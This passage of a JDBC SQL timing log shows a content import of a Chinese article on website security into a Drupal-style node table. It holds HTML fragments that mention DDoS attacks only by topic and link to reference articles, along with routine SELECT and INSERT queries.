data-key="678"><span data-slate-leaf="true" data-offset-key="678:0" data-first-offset="true"><span 
data-slate-string="true">关于 DDoS 攻击的分类，可以参阅这个</span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="679" class="se-d795ea91 se-eb2c7cbb"><span data-slate-object="text" 
data-key="680"><span data-slate-leaf="true" data-offset-key="680:0" data-first-offset="true"><span 
data-slate-string="true">词条</span></span></span></a><span data-slate-object="text" data-key="681"><span 
data-slate-leaf="true" data-offset-key="681:0" data-first-offset="true"><span data-slate-string="true">，国内很多个人站点的站长都对它深恶痛绝，比如你可以看看</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="682" class="se-d795ea91 se-eb2c7cbb"><span 
data-slate-object="text" data-key="683"><span data-slate-leaf="true" data-offset-key="683:0" 
data-first-offset="true"><span data-slate-string="true">这篇记录</span></span></span></a><span 
data-slate-object="text" data-key="684"><span data-slate-leaf="true" data-offset-key="684:0" 
data-first-offset="true"><span data-slate-string="true">，还有关于历史上五个最著名的 DDoS 攻击请参阅</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="685" class="se-d795ea91 se-eb2c7cbb"><span 
data-slate-object="text" data-key="686"><span data-slate-leaf="true" data-offset-key="686:0" 
data-first-offset="true"><span data-slate-string="true">这篇文章</span></span></span></a><span 
data-slate-object="text" data-key="687"><span data-slate-leaf="true" data-offset-key="687:0" 
data-first-offset="true"><span data-slate-string="true">。</span></span></span> </div> </div> 
<div class="se-68ff1455" data-slate-type="image" data-slate-object="block" data-key="688"> 
<img class="se-d37f13c3" src="https://static001.geekbang.org/resource/image/11/8b/1181246bbd51ce348d5729696d1dc28b.jpg"> 
</div> </div>', '', 'book', 0, 'full_html', 'zh-hans', 15, 15) 
 {executed in 1 msec}
2020-11-19 11:08:37.076 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_, nodefiledd0_.changed as changed2_9_, nodefiledd0_.created 
as created3_9_, nodefiledd0_.default_langcode as default_4_9_, nodefiledd0_.langcode as langcode5_9_, 
nodefiledd0_.promote as promote6_9_, nodefiledd0_.revision_translation_affected as revision7_9_, 
nodefiledd0_.status as status8_9_, nodefiledd0_.sticky as sticky9_9_, nodefiledd0_.title as 
title10_9_, nodefiledd0_.type as type11_9_, nodefiledd0_.uid as uid12_9_, nodefiledd0_.vid 
as vid13_9_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=15 
 {executed in 0 msec}
2020-11-19 11:08:37.076 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |type |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|

2020-11-19 11:08:37.077 INFO  jdbc.sqltiming Line:373 - select nodefieldr0_.nid as nid1_10_0_, nodefieldr0_.changed as changed2_10_0_, nodefieldr0_.created 
as created3_10_0_, nodefieldr0_.default_langcode as default_4_10_0_, nodefieldr0_.langcode 
as langcode5_10_0_, nodefieldr0_.promote as promote6_10_0_, nodefieldr0_.revision_translation_affected 
as revision7_10_0_, nodefieldr0_.status as status8_10_0_, nodefieldr0_.sticky as sticky9_10_0_, 
nodefieldr0_.title as title10_10_0_, nodefieldr0_.uid as uid11_10_0_, nodefieldr0_.vid as vid12_10_0_ 
from node_field_revision nodefieldr0_ where nodefieldr0_.nid=15 
 {executed in 0 msec}
2020-11-19 11:08:37.077 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|

2020-11-19 11:08:37.078 INFO  jdbc.sqltiming Line:373 - insert into node_field_revision (changed, created, default_langcode, langcode, promote, revision_translation_affected, 
status, sticky, title, uid, vid, nid) values (1605755317, 1605755317, 1, 'zh-hans', 0, 1, 1, 
0, '31丨防人之心不可无：网站安全问题窥视', 1, 15, 15) 
 {executed in 0 msec}
2020-11-19 11:08:37.085 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_0_, nodefiledd0_.changed as changed2_9_0_, nodefiledd0_.created 
as created3_9_0_, nodefiledd0_.default_langcode as default_4_9_0_, nodefiledd0_.langcode as 
langcode5_9_0_, nodefiledd0_.promote as promote6_9_0_, nodefiledd0_.revision_translation_affected 
as revision7_9_0_, nodefiledd0_.status as status8_9_0_, nodefiledd0_.sticky as sticky9_9_0_, 
nodefiledd0_.title as title10_9_0_, nodefiledd0_.type as type11_9_0_, nodefiledd0_.uid as uid12_9_0_, 
nodefiledd0_.vid as vid13_9_0_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=15 
 {executed in 0 msec}
